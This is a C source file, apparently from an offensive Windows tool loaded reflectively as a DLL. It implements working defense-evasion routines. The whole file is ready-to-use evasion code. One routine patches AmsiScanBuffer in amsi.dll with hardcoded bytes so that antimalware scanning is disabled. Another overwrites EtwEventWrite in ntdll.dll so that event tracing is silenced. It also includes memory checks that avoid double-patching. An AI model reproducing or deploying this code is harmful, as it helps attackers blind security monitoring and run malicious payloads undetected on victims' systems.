#include "Util.h"
#include "PEB.h"
#include "syscalls.h"

#ifdef WIN_X64
UCHAR _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
#ifdef WIN_X86
UCHAR _patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
#endif

// Patch to return STATUS_SUCCESS (0) immediately
// For x64: xor eax, eax (2 bytes) + ret (1 byte) = 3 bytes total
#ifdef WIN_X64
UCHAR _etwPatch[] = { 0x31, 0xC0, 0xC3 };  // xor eax, eax; ret
#else
UCHAR _etwPatch[] = { 0x31, 0xC0, 0xC2, 0x14, 0x00 };  // xor eax, eax; ret 0x14
#endif

// Track if patches have already been applied (to avoid double-patching in same process)
// Note: These are reset if DLL is reflectively loaded multiple times, so we also do memory checks
static BOOL g_etwPatched = FALSE;
static BOOL g_amsiPatched = FALSE;

// Check if ETW is already patched by inspecting memory
BOOL isEtwPatched() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		return FALSE;
	}

	LPVOID eventWriteAddr = (LPVOID)GetProcAddress(hNtdll, "EtwEventWrite");
	if (eventWriteAddr == NULL) {
		return FALSE;
	}

	// Check if first bytes match our patch (0x31 0xC0 = xor eax, eax)
	if (*(USHORT*)eventWriteAddr == 0xC031) {
		return TRUE;
	}

	return FALSE;
}

// Check if AMSI is already patched by inspecting memory
BOOL isAmsiPatched() {
	HMODULE hAmsi = GetModuleHandleA("amsi.dll");
	if (hAmsi == NULL) {
		return FALSE;
	}

	LPVOID pAmsiScanBuffer = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
	if (pAmsiScanBuffer == NULL) {
		return FALSE;
	}

	// Check if first byte matches our patch (0xB8 = mov eax, imm32)
	if (*(UCHAR*)pAmsiScanBuffer == 0xB8) {
		return TRUE;
	}

	return FALSE;
}

// Return values for patch functions:
// 0 = Success (newly patched)
// 1 = Already patched (skipped)
// -1 = Error

int patchAmci() {
	// Check if already patched in this process (via our tracking)
	if (g_amsiPatched) {
		printf("[+]: AMSI already patched (tracked), skipping\n");
		_separator();
		fflush(stdout);
		return 1;
	}

	// Check if already patched by inspecting memory (from previous DLL load)
	if (isAmsiPatched()) {
		printf("[+]: AMSI already patched (memory check), skipping\n");
		g_amsiPatched = TRUE;
		_separator();
		fflush(stdout);
		return 1;
	}

	printf("[+]: Start Patching AMSI...\n");
	fflush(stdout);

	HMODULE hAmsi = LoadLibraryA("amsi.dll");
	if (hAmsi == NULL) {
		printf("[!]: Failed to load AMSI.DLL\n");
		fflush(stdout);
		return -1;
	}

	LPVOID pAmsiScanBuffer = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
	
	printf("[+]: AMSI.DLL Module Base Address: 0x%p\n", (void*)hAmsi);
	fflush(stdout);

	if (pAmsiScanBuffer != NULL) {
		printf("[+]: AmsiScanBuffer Export located at Address: 0x%p\n", pAmsiScanBuffer);
		fflush(stdout);

		DWORD OldProtection;
		SIZE_T pSize = sizeof(_patchBytes);

		if (!VirtualProtect(pAmsiScanBuffer, pSize, PAGE_READWRITE, &OldProtection)) {
			printf("[!]: Error VirtualProtect (error: %lu)\n", GetLastError());
			fflush(stdout);
			return -1;
		}

		printf("[+]: Patching AmsiScanBuffer 0x%p\n", pAmsiScanBuffer);
		fflush(stdout);

		memcpy(pAmsiScanBuffer, _patchBytes, pSize);
		FlushInstructionCache(GetCurrentProcess(), pAmsiScanBuffer, pSize);
		printf("[+]: %zu bytes patched\n", pSize);

		DWORD temp;
		VirtualProtect(pAmsiScanBuffer, pSize, OldProtection, &temp);

		g_amsiPatched = TRUE;

		printf("[+]: AMSI Patching Done.\n");
		_separator();
		fflush(stdout);
		return 0;
	} else {
		printf("[!]: Failed to find AmsiScanBuffer export\n");
		fflush(stdout);
		return -1;
	}
}

int patchEtw() {
	// Check if already patched in this process (via our tracking)
	if (g_etwPatched) {
		printf("[+]: ETW already patched (tracked), skipping\n");
		_separator();
		fflush(stdout);
		return 1;
	}

	// Check if already patched by inspecting memory (from previous DLL load)
	if (isEtwPatched()) {
		printf("[+]: ETW already patched (memory check), skipping\n");
		g_etwPatched = TRUE;
		_separator();
		fflush(stdout);
		return 1;
	}

	printf("[+]: Patching ETW...\n");
	fflush(stdout);

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[!]: Failed to get ntdll.dll handle\n");
		fflush(stdout);
		return -1;
	}

	printf("[+]: NTDLL.DLL Module Base Address: 0x%p\n", (void*)hNtdll);
	fflush(stdout);

	LPVOID eventWriteAddr = (LPVOID)GetProcAddress(hNtdll, "EtwEventWrite");
	printf("[+]: EtwEventWrite Export located at Address: 0x%p\n", eventWriteAddr);
	fflush(stdout);

	if (eventWriteAddr == NULL) {
		printf("[!]: Failed to find EtwEventWrite export\n");
		fflush(stdout);
		return -1;
	}

	SIZE_T patchSize = sizeof(_etwPatch);
	DWORD oldProtection;

	if (!VirtualProtect(eventWriteAddr, patchSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
		printf("[!]: Error VirtualProtect (error: %lu)\n", GetLastError());
		fflush(stdout);
		return -1;
	}

	printf("[+]: Patching EtwEventWrite 0x%p\n", eventWriteAddr);
	fflush(stdout);

	memcpy(eventWriteAddr, _etwPatch, patchSize);
	FlushInstructionCache(GetCurrentProcess(), eventWriteAddr, patchSize);
	printf("[+]: %zu bytes patched\n", patchSize);

	DWORD temp;
	VirtualProtect(eventWriteAddr, patchSize, oldProtection, &temp);

	g_etwPatched = TRUE;

	printf("[+]: ETW Patching Done.\n");
	_separator();
	fflush(stdout);
	return 0;
}
